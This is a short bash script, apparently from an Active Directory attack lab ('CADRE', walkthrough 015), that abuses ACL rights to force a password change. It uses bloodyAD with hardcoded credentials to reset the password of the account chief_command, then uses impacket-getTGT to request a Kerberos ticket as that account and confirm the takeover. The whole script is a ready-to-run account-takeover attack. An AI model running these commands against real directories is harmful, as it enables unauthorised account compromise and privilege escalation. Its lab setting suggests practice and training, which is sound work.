#!/bin/bash
# CADRE — WT#015 ACL ForceChangePassword
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#015 — ACL ForceChangePassword"
start_attack "015" "ACL ForceChangePassword"

require_tool bloodyAD
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: ForceChangePassword on chief_command via WriteDacl escalation"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u hunter_dfir -p 'DF1R_Hunt3r!' set password \"CN=chief_command,OU=Command,DC=cadre,DC=local\" 'NewP@ssw0rd!'"

step "Step 2: Verify new password by requesting a TGT"
run_cmd "impacket-getTGT \"$DOMAIN_ROOT/chief_command:NewP@ssw0rd!\" -dc-ip $DC01"

result $? "ForceChangePassword attack completed"
